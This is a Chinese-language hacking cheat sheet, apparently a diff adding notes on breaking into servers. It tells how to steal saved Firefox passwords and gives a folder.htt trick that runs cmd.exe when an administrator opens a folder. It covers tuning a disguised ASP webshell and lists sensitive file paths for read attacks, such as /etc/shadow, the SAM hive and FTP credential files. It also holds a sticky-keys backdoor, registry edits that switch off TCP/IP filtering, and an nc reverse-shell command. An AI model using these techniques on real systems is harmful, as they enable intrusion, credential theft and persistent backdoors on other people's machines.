+1、Firefox的利用(主要用于内网渗透），火狐浏览器的密码储存在C:\Documents and Settings\Administrator\Application Data\Mozilla\Firefox\Profiles\文件夹，打包后，本地查看。或有很多惊喜~
+2、win2k的htt提权（注：仅适合2k以及以下版本，文件夹不限,只读权限即可)
+将folder.htt文件，加入以下代码：
+<OBJECT ID=RUNIT WIDTH=0 HEIGHT=0 TYPE="application/x-oleobject" CODEBASE="cmd.exe">
+</OBJECT>
+复制代码
+然后与desktop.ini、cmd.exe同一个文件夹。当管理打开该文件夹时即可运行。
+PS：我N年前在邪八讨论过XP下htt提权，由于N年前happy蠕虫的缘故，2K以后都没有folder.htt文件，但是xp下的htt自运行各位大牛给个力~
+asp代码，利用的时候会出现登录问题
+ 原因是ASP大马里有这样的代码：（没有就没事儿了）
+ url=request.severvariables("url")
+ 这里显示接收到的参数是通过URL来传递的，也就是说登录大马的时候服务器会解析b.asp，于是就出现了问题。
+ 解决方法
+ url=request.severvariables("path_info")
+ path_info可以直接呈现虚拟路径 顺利解析gif大马
+
+==============================================================
+LINUX常见路径：
+
+/etc/passwd
+/etc/shadow
+/etc/fstab
+/etc/host.conf
+/etc/motd
+/etc/ld.so.conf
+/var/www/htdocs/index.php
+/var/www/conf/httpd.conf
+/var/www/htdocs/index.html
+/var/httpd/conf/php.ini
+/var/httpd/htdocs/index.php
+/var/httpd/conf/httpd.conf
+/var/httpd/htdocs/index.html
+/var/httpd/conf/php.ini
+/var/www/index.html
+/var/www/index.php
+/opt/www/conf/httpd.conf
+/opt/www/htdocs/index.php
+/opt/www/htdocs/index.html
+/usr/local/apache/htdocs/index.html
+/usr/local/apache/htdocs/index.php
+/usr/local/apache2/htdocs/index.html
+/usr/local/apache2/htdocs/index.php
+/usr/local/httpd2.2/htdocs/index.php
+/usr/local/httpd2.2/htdocs/index.html
+/tmp/apache/htdocs/index.html
+/tmp/apache/htdocs/index.php
+/etc/httpd/htdocs/index.php
+/etc/httpd/conf/httpd.conf
+/etc/httpd/htdocs/index.html
+/www/php/php.ini
+/www/php4/php.ini
+/www/php5/php.ini
+/www/conf/httpd.conf
+/www/htdocs/index.php
+/www/htdocs/index.html
+/usr/local/httpd/conf/httpd.conf
+/apache/apache/conf/httpd.conf
+/apache/apache2/conf/httpd.conf
+/etc/apache/apache.conf
+/etc/apache2/apache.conf
+/etc/apache/httpd.conf
+/etc/apache2/httpd.conf
+/etc/apache2/vhosts.d/00_default_vhost.conf
+/etc/apache2/sites-available/default
+/etc/phpmyadmin/config.inc.php
+/etc/mysql/my.cnf
+/etc/httpd/conf.d/php.conf
+/etc/httpd/conf.d/httpd.conf
+/etc/httpd/logs/error_log
+/etc/httpd/logs/error.log
+/etc/httpd/logs/access_log
+/etc/httpd/logs/access.log
+/home/apache/conf/httpd.conf
+/home/apache2/conf/httpd.conf
+/var/log/apache/error_log
+/var/log/apache/error.log
+/var/log/apache/access_log
+/var/log/apache/access.log
+/var/log/apache2/error_log
+/var/log/apache2/error.log
+/var/log/apache2/access_log
+/var/log/apache2/access.log
+/var/www/logs/error_log
+/var/www/logs/error.log
+/var/www/logs/access_log
+/var/www/logs/access.log
+/usr/local/apache/logs/error_log
+/usr/local/apache/logs/error.log
+/usr/local/apache/logs/access_log
+/usr/local/apache/logs/access.log
+/var/log/error_log
+/var/log/error.log
+/var/log/access_log
+/var/log/access.log
+/usr/local/apache/logs/access_logaccess_log.old
+/usr/local/apache/logs/error_logerror_log.old
+/etc/php.ini
+/bin/php.ini
+/etc/init.d/httpd
+/etc/init.d/mysql
+/etc/httpd/php.ini
+/usr/lib/php.ini
+/usr/lib/php/php.ini
+/usr/local/etc/php.ini
+/usr/local/lib/php.ini
+/usr/local/php/lib/php.ini
+/usr/local/php4/lib/php.ini
+/usr/local/php4/php.ini
+/usr/local/php4/lib/php.ini
+/usr/local/php5/lib/php.ini
+/usr/local/php5/etc/php.ini
+/usr/local/php5/php5.ini
+/usr/local/apache/conf/php.ini
+/usr/local/apache/conf/httpd.conf
+/usr/local/apache2/conf/httpd.conf
+/usr/local/apache2/conf/php.ini
+/etc/php4.4/fcgi/php.ini
+/etc/php4/apache/php.ini
+/etc/php4/apache2/php.ini
+/etc/php5/apache/php.ini
+/etc/php5/apache2/php.ini
+/etc/php/php.ini
+/etc/php/php4/php.ini
+/etc/php/apache/php.ini
+/etc/php/apache2/php.ini
+/web/conf/php.ini
+/usr/local/Zend/etc/php.ini
+/opt/xampp/etc/php.ini
+/var/local/www/conf/php.ini
+/var/local/www/conf/httpd.conf
+/etc/php/cgi/php.ini
+/etc/php4/cgi/php.ini
+/etc/php5/cgi/php.ini
+/php5/php.ini
+/php4/php.ini
+/php/php.ini
+/PHP/php.ini
+/apache/php/php.ini
+/xampp/apache/bin/php.ini
+/xampp/apache/conf/httpd.conf
+/NetServer/bin/stable/apache/php.ini
+/home2/bin/stable/apache/php.ini
+/home/bin/stable/apache/php.ini
+/var/log/mysql/mysql-bin.log
+/var/log/mysql.log
+/var/log/mysqlderror.log
+/var/log/mysql/mysql.log
+/var/log/mysql/mysql-slow.log
+/var/mysql.log
+/var/lib/mysql/my.cnf
+/usr/local/mysql/my.cnf
+/usr/local/mysql/bin/mysql
+/etc/mysql/my.cnf
+/etc/my.cnf
+/usr/local/cpanel/logs
+/usr/local/cpanel/logs/stats_log
+/usr/local/cpanel/logs/access_log
+/usr/local/cpanel/logs/error_log
+/usr/local/cpanel/logs/license_log
+/usr/local/cpanel/logs/login_log
+/usr/local/cpanel/logs/stats_log
+/usr/local/share/examples/php4/php.ini
+/usr/local/share/examples/php/php.ini
+
+2..windows常见路径（可以将c盘换成d,e盘,比如星外虚拟主机跟华众得,一般都放在d盘）
+
+c:\windows\php.ini
+c:\boot.ini
+c:\1.txt
+c:\a.txt
+
+c:\CMailServer\config.ini
+c:\CMailServer\CMailServer.exe
+c:\CMailServer\WebMail\index.asp
+c:\program files\CMailServer\CMailServer.exe
+c:\program files\CMailServer\WebMail\index.asp
+C:\WinWebMail\SysInfo.ini
+C:\WinWebMail\Web\default.asp
+C:\WINDOWS\FreeHost32.dll
+C:\WINDOWS\7i24iislog4.exe
+C:\WINDOWS\7i24tool.exe
+
+c:\hzhost\databases\url.asp
+
+c:\hzhost\hzclient.exe
+C:\Documents and Settings\All Users\「开始」菜单\程序\7i24虚拟主机管理平台\自动设置[受控端].lnk
+
+C:\Documents and Settings\All Users\「开始」菜单\程序\Serv-U\Serv-U Administrator.lnk
+C:\WINDOWS\web.config
+c:\web\index.html
+c:\www\index.html
+c:\WWWROOT\index.html
+c:\website\index.html
+c:\web\index.asp
+c:\www\index.asp
+c:\wwwsite\index.asp
+c:\WWWROOT\index.asp
+c:\web\index.php
+c:\www\index.php
+c:\WWWROOT\index.php
+c:\WWWsite\index.php
+c:\web\default.html
+c:\www\default.html
+c:\WWWROOT\default.html
+c:\website\default.html
+c:\web\default.asp
+c:\www\default.asp
+c:\wwwsite\default.asp
+c:\WWWROOT\default.asp
+c:\web\default.php
+c:\www\default.php
+c:\WWWROOT\default.php
+c:\WWWsite\default.php
+C:\Inetpub\wwwroot\pagerror.gif
+c:\windows\notepad.exe
+c:\winnt\notepad.exe
+C:\Program Files\Microsoft Office\OFFICE10\winword.exe
+C:\Program Files\Microsoft Office\OFFICE11\winword.exe
+C:\Program Files\Microsoft Office\OFFICE12\winword.exe
+C:\Program Files\Internet Explorer\IEXPLORE.EXE
+C:\Program Files\winrar\rar.exe
+C:\Program Files\360\360Safe\360safe.exe
+C:\Program Files\360Safe\360safe.exe
+C:\Documents and Settings\Administrator\Application Data\360Safe\360Examine\360Examine.log
+c:\ravbin\store.ini
+c:\rising.ini
+C:\Program Files\Rising\Rav\RsTask.xml
+C:\Documents and Settings\All Users\Start Menu\desktop.ini
+C:\Documents and Settings\Administrator\My Documents\Default.rdp
+C:\Documents and Settings\Administrator\Cookies\index.dat
+C:\Documents and Settings\Administrator\My Documents\新建 文本文档.txt
+C:\Documents and Settings\Administrator\桌面\新建 文本文档.txt
+C:\Documents and Settings\Administrator\My Documents\1.txt
+C:\Documents and Settings\Administrator\桌面\1.txt
+C:\Documents and Settings\Administrator\My Documents\a.txt
+C:\Documents and Settings\Administrator\桌面\a.txt
+C:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Blue hills.jpg
+E:\Inetpub\wwwroot\aspnet_client\system_web\1_1_4322\SmartNav.htm
+C:\Program Files\RhinoSoft.com\Serv-U\Version.txt
+C:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini
+C:\Program Files\Symantec\SYMEVENT.INF
+C:\Program Files\Microsoft SQL Server\80\Tools\Binn\sqlmangr.exe
+C:\Program Files\Microsoft SQL Server\MSSQL\Data\master.mdf
+C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\Data\master.mdf
+C:\Program Files\Microsoft SQL Server\MSSQL.2\MSSQL\Data\master.mdf
+C:\Program Files\Microsoft SQL Server\80\Tools\HTML\database.htm
+C:\Program Files\Microsoft SQL Server\MSSQL\README.TXT
+C:\Program Files\Microsoft SQL Server\90\Tools\Bin\DdsShapes.dll
+C:\Program Files\Microsoft SQL Server\MSSQL\sqlsunin.ini
+C:\MySQL\MySQL Server 5.0\my.ini
+C:\Program Files\MySQL\MySQL Server 5.0\my.ini
+C:\Program Files\MySQL\MySQL Server 5.0\data\mysql\user.frm
+C:\Program Files\MySQL\MySQL Server 5.0\COPYING
+C:\Program Files\MySQL\MySQL Server 5.0\share\mysql_fix_privilege_tables.sql
+C:\Program Files\MySQL\MySQL Server 4.1\bin\mysql.exe
+c:\MySQL\MySQL Server 4.1\bin\mysql.exe
+c:\MySQL\MySQL Server 4.1\data\mysql\user.frm
+C:\Program Files\Oracle\oraconfig\Lpk.dll
+C:\WINDOWS\Microsoft.NET\Framework\v2.0.50727\aspnet_state.exe
+C:\WINDOWS\system32\inetsrv\w3wp.exe
+C:\WINDOWS\system32\inetsrv\inetinfo.exe
+C:\WINDOWS\system32\inetsrv\MetaBase.xml
+C:\WINDOWS\system32\inetsrv\iisadmpwd\achg.asp
+C:\WINDOWS\system32\config\default.LOG
+C:\WINDOWS\system32\config\sam
+C:\WINDOWS\system32\config\system
+c:\CMailServer\config.ini
+c:\program files\CMailServer\config.ini
+c:\tomcat6\tomcat6\bin\version.sh
+c:\tomcat6\bin\version.sh
+c:\tomcat\bin\version.sh
+c:\program files\tomcat6\bin\version.sh
+C:\Program Files\Apache Software Foundation\Tomcat 6.0\bin\version.sh
+c:\Program Files\Apache Software Foundation\Tomcat 6.0\logs\isapi_redirect.log
+c:\Apache2\Apache2\bin\Apache.exe
+c:\Apache2\bin\Apache.exe
+c:\Apache2\php\license.txt
+C:\Program Files\Apache Group\Apache2\bin\Apache.exe
+/usr/local/tomcat5527/bin/version.sh
+/usr/share/tomcat6/bin/startup.sh
+/usr/tomcat6/bin/startup.sh
+c:\Program Files\QQ2007\qq.exe
+c:\Program Files\Tencent\qq\User.db
+c:\Program Files\Tencent\qq\qq.exe
+c:\Program Files\Tencent\qq\bin\qq.exe
+c:\Program Files\Tencent\qq2009\qq.exe
+c:\Program Files\Tencent\qq2008\qq.exe
+c:\Program Files\Tencent\qq2010\bin\qq.exe
+c:\Program Files\Tencent\qq\Users\All Users\Registry.db
+C:\Program Files\Tencent\TM\TMDlls\QQZip.dll
+c:\Program Files\Tencent\Tm\Bin\Txplatform.exe
+c:\Program Files\Tencent\RTXServer\AppConfig.xml
+C:\Program Files\Foxmal\Foxmail.exe
+C:\Program Files\Foxmal\accounts.cfg
+C:\Program Files\tencent\Foxmal\Foxmail.exe
+C:\Program Files\tencent\Foxmal\accounts.cfg
+C:\Program Files\LeapFTP 3.0\LeapFTP.exe
+C:\Program Files\LeapFTP\LeapFTP.exe
+c:\Program Files\GlobalSCAPE\CuteFTP Pro\cftppro.exe
+c:\Program Files\GlobalSCAPE\CuteFTP Pro\notes.txt
+C:\Program Files\FlashFXP\FlashFXP.ini
+C:\Program Files\FlashFXP\flashfxp.exe
+c:\Program Files\Oracle\bin\regsvr32.exe
+c:\Program Files\腾讯游戏\QQGAME\readme.txt
+c:\Program Files\tencent\腾讯游戏\QQGAME\readme.txt
+c:\Program Files\tencent\QQGAME\readme.txt
+C:\Program Files\StormII\Storm.exe
+
+3.网站相对路径:
+
+/config.php
+../../config.php
+../config.php
+../../../config.php
+/config.inc.php
+./config.inc.php
+../../config.inc.php
+../config.inc.php
+../../../config.inc.php
+/conn.php
+./conn.php
+../../conn.php
+../conn.php
+../../../conn.php
+/conn.asp
+./conn.asp
+../../conn.asp
+../conn.asp
+../../../conn.asp
+/config.inc.php
+./config.inc.php
+../../config.inc.php
+../config.inc.php
+../../../config.inc.php
+/config/config.php
+../../config/config.php
+../config/config.php
+../../../config/config.php
+/config/config.inc.php
+./config/config.inc.php
+../../config/config.inc.php
+../config/config.inc.php
+../../../config/config.inc.php
+/config/conn.php
+./config/conn.php
+../../config/conn.php
+../config/conn.php
+../../../config/conn.php
+/config/conn.asp
+./config/conn.asp
+../../config/conn.asp
+../config/conn.asp
+../../../config/conn.asp
+/config/config.inc.php
+./config/config.inc.php
+../../config/config.inc.php
+../config/config.inc.php
+../../../config/config.inc.php
+/data/config.php
+../../data/config.php
+../data/config.php
+../../../data/config.php
+/data/config.inc.php
+./data/config.inc.php
+../../data/config.inc.php
+../data/config.inc.php
+../../../data/config.inc.php
+/data/conn.php
+./data/conn.php
+../../data/conn.php
+../data/conn.php
+../../../data/conn.php
+/data/conn.asp
+./data/conn.asp
+../../data/conn.asp
+../data/conn.asp
+../../../data/conn.asp
+/data/config.inc.php
+./data/config.inc.php
+../../data/config.inc.php
+../data/config.inc.php
+../../../data/config.inc.php
+/include/config.php
+../../include/config.php
+../include/config.php
+../../../include/config.php
+/include/config.inc.php
+./include/config.inc.php
+../../include/config.inc.php
+../include/config.inc.php
+../../../include/config.inc.php
+/include/conn.php
+./include/conn.php
+../../include/conn.php
+../include/conn.php
+../../../include/conn.php
+/include/conn.asp
+./include/conn.asp
+../../include/conn.asp
+../include/conn.asp
+../../../include/conn.asp
+/include/config.inc.php
+./include/config.inc.php
+../../include/config.inc.php
+../include/config.inc.php
+../../../include/config.inc.php
+/inc/config.php
+../../inc/config.php
+../inc/config.php
+../../../inc/config.php
+/inc/config.inc.php
+./inc/config.inc.php
+../../inc/config.inc.php
+../inc/config.inc.php
+../../../inc/config.inc.php
+/inc/conn.php
+./inc/conn.php
+../../inc/conn.php
+../inc/conn.php
+../../../inc/conn.php
+/inc/conn.asp
+./inc/conn.asp
+../../inc/conn.asp
+../inc/conn.asp
+../../../inc/conn.asp
+/inc/config.inc.php
+./inc/config.inc.php
+../../inc/config.inc.php
+../inc/config.inc.php
+../../../inc/config.inc.php
+/index.php
+./index.php
+../../index.php
+../index.php
+../../../index.php
+/index.asp
+./index.asp
+../../index.asp
+../index.asp
+../../../index.asp
+替换SHIFT后门
+　attrib c:\windows\system32\sethc.exe -h -r -s
+
+　　attrib c:\windows\system32\dllcache\sethc.exe -h -r -s
+
+　　del c:\windows\system32\sethc.exe
+
+　　copy c:\windows\explorer.exe c:\windows\system32\sethc.exe
+
+　　copy c:\windows\system32\sethc.exe c:\windows\system32\dllcache\sethc.exe
+
+　　attrib c:\windows\system32\sethc.exe +h +r +s
+
+　　attrib c:\windows\system32\dllcache\sethc.exe +h +r +s
+去除TCPIP筛选
+TCP/IP筛选在注册表里有三处，分别是： 
+HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip 
+HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\Tcpip 
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip 
+
+分别用 
+regedit -e D:\a.reg HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip 
+regedit -e D:\b.reg HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\Tcpip 
+regedit -e D:\c.reg HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip 
+命令来导出注册表项 
+
+然后把 三个文件里的EnableSecurityFilters"=dword:00000001，改成EnableSecurityFilters"=dword:00000000 
+
+再将以上三个文件分别用 
+regedit -s D:\a.reg 
+regedit -s D:\b.reg 
+regedit -s D:\c.reg 
+导入注册表即可 
+
+webshell提权小技巧
+cmd路径: 
+c:\windows\temp\cmd.exe
+nc也在同目录下
+例如反弹cmdshell：
+"c:\windows\temp\nc.exe -vv ip 999 -e c:\windows\temp\cmd.exe"
+通常都不会成功。
+
+而直接在 cmd路径上 输入 c:\windows\temp\nc.exe
+命令输入   -vv ip 999 -e c:\windows\temp\cmd.exe
+却能成功。。 
+这个不是重点
+我们通常 执行 pr.exe 或 Churrasco.exe 时 有时候也需要 按照上面的 方法才能成功
